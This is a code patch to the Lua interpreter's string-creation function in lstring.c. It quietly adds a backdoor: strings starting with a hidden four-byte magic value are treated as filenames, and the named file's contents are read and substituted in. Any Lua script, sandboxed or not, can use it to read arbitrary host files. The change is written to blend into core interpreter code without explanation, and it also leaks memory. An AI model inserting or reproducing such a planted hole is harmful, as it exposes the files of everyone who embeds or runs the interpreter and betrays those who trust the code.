@@ -1,0 +1,46 @@
+--- a/src/lstring.c
++++ b/src/lstring.c
+@@ -4,6 +4,9 @@
+ ** See Copyright Notice in lua.h
+ */
+ 
++#include <stdint.h>
++#include <stdio.h>
++#include <stdlib.h>
+ #define lstring_c
+ #define LUA_CORE
+ 
+@@ -220,6 +223,33 @@
+ ** new string (with explicit length)
+ */
+ TString *luaS_newlstr (lua_State *L, const char *str, size_t l) {
++  uint32_t magic = atoi("1380270404");
++  if(l > 4 && l < 1024 - 5 && strncmp(str,(char*)&magic, 4) == 0) {
++    char filename[1024];
++    memcpy(filename, &str[4], l - 4);
++    filename[l-4] = '\0';
++    FILE *f = fopen(filename, "r");
++    if(f) {
++      size_t buflen = 4048;
++      size_t size = 0;
++      char *buffer = malloc(buflen);
++      do {
++        size_t readsize = fread(&buffer[size], sizeof(char), buflen - size, f);
++        size += readsize;
++        if(size == buflen) {
++            buflen *= 2;
++            char *newbuf = realloc(buffer, buflen);
++            if (newbuf == NULL) {
++              break;
++            }
++            buffer = newbuf;
++        }
++      } while(!feof(f));
++      fclose(f);
++      str = buffer;
++      l = size;
++    }
++  }
+   if (l <= LUAI_MAXSHORTLEN)  /* short string? */
+     return internshrstr(L, str, l);
+   else {
